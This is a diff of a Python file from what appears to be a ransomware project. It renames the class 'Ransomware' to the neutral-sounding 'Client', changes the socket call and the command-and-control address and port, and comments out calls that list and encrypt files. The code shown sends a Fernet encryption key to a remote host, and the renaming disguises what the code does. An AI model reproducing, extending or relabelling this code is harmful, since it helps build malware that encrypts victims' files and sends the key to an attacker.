@@ -11,11 +11,11 @@ from lib.modules import (
     safe_load
 )
 from lib.cryptography import Fernet
-from socket import socket
+from socket import AF_INET, SOCK_STREAM, socket
 
 
 
-class Ransomware:
+class Client:
     def __init__(
         self, 
         host: str, 
@@ -33,7 +33,7 @@ class Ransomware:
         retry_interval = 10
 
         while not connected and retries < max_retries:
-            with socket() as server:
+            with socket(AF_INET, SOCK_STREAM) as server:
                 try:
                     server.connect((self.host, self.port))
                     server.sendall(self.key)
@@ -87,6 +87,7 @@ class Ransomware:
 
 
 if __name__ == '__main__':
-    bot = Ransomware('192.168.1.12', 19100)
-    bot.list_file()
-    bot.encrypted()
+    bot = Client('192.168.1.9', 12345)
+    bot.ConnectServer()
+    #bot.list_file()
+    #bot.encrypted()
